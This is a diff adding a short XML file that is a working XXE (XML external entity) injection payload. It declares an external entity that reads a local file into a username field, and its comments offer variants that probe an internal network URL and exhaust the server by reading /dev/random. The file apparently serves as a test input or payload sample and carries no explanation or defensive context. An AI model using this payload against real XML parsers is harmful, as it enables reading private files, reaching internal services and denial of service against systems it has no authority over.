@@ -1,0 +1,10 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE username [
+        <!ELEMENT username ANY >
+        <!ENTITY xxe SYSTEM "file:///C:/TEMP/foo.csv" >]>
+<!-- You can also probe information from a URL directly -->
+<!-- <!ENTITY xxe SYSTEM "https://192.168.1.1/private" >]> -->
+
+<!-- You can also DDOS the system by loading a never ending stream -->
+<!-- <!ENTITY xxe SYSTEM "file:///dev/random" >]> -->
+<username>&xxe;</username>
